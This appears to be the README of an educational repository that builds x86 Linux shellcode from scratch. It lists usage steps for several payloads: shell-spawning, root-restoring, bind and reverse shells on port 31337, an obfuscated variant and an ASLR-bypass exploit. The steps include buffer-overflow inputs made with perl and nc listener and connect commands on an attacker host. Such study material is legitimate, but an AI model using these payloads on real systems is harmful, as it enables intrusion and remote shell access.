# Raw Shellcode

Some C and x86 Assembly code to build a shell-spawning shellcode from scratch

Tested on **Linux Kernel 2.6.20**


### List of files

#### getenvaddr.c

Get the (shellcode) environment variable address within a program
```
$ gcc -g -o getenvaddr getenvaddr.c
$ ./getenvaddr: <env_var> <vuln_program>
```

#### exec_shell

Spawn a shell with execve()
```
$ nasm <exec_shell.s>
$ export SHELLCODE=$(cat exec_shell)
$ ./getenvaddr SHELLCODE ./<vuln_program>
$ ./vuln_program $(perl -e 'print "\xEF\xEB\xAD\xDE"x40;')
```

#### priv_shell

Restore root privileges and spawn a shell
```
$ gcc -o drop_priv drop_priv.c
$ nasm <priv_shell.s>
$ export SHELLCODE=$(cat priv_shell)
$ ./getenvaddr SHELLCODE ./<drop_priv>
$ ./drop_priv $(perl -e 'print "\xEF\xEB\xAD\xDE"x40;')
```

#### priv_shell2

Reviewed payload
```
$ gcc -o drop_priv drop_priv.c
$ nasm <priv_shell2.s>
$ export SHELLCODE=$(cat priv_shell2)
$ ./getenvaddr SHELLCODE ./<vuln_program>
$ ./drop_priv $(perl -e 'print "\xEF\xEB\xAD\xDE"x40;')
```

#### bind_port

Create a TCP socket, bind to port 31337 and wait for clients
```
$ nasm <bind_port.s>
$ export SHELLCODE=$(cat bind_port)
$ ./getenvaddr SHELLCODE ./<vuln_program>
$ ./vuln_program $(perl -e 'print "\xEF\xEB\xAD\xDE"x40;')
```

#### bind_shell

Bind a shell on port 31337
```
$ nasm <bind_shell.s>
$ export SHELLCODE=$(cat bind_shell)
$ ./getenvaddr SHELLCODE ./<vuln_program>
$ ./vuln_program $(perl -e 'print "\xEF\xEB\xAD\xDE"x40;')
bad$ nc <IP> 31337  # connect to target
```

#### bind_shell2

Reviewed payload
```
$ nasm <bind_shell2.s>
$ export SHELLCODE=$(cat bind_shell2)
$ ./getenvaddr SHELLCODE ./<vuln_program>
$ ./vuln_program $(perl -e 'print "\xEF\xEB\xAD\xDE"x40;')
bad$ nc <IP> 31337  # connect to target
```

#### reverse_shell

Connect back to <bad_IP>:31337 and open a shell
```
$ nasm <reverse_shell.s>
$ export SHELLCODE=$(cat reverse_shell)
$ ./getenvaddr SHELLCODE ./<vuln_program>
bad$ nc -lp 31337  # listen for victim
$ ./vuln_program $(perl -e 'print "\xEF\xEB\xAD\xDE"x40;')
```

#### reverse_shell_obf

Obfuscated payload
```
$ nasm <reverse_shell_obf.s>
$ export SHELLCODE=$(cat reverse_shell_obf)
$ ./getenvaddr SHELLCODE ./<vuln_program>
bad$ nc -lp 31337  # listen for victim
$ ./vuln_program $(perl -e 'print "\xEF\xEB\xAD\xDE"x40;')
```

#### aslr_exploit

Exploit aslr_vuln program, bypass ASLR restriction and spawn a shell
```
$ gcc -o aslr_vuln aslr_vuln.c
$ gcc -o aslr_exploit aslr_exploit.c
$ ./aslr_exploit
```
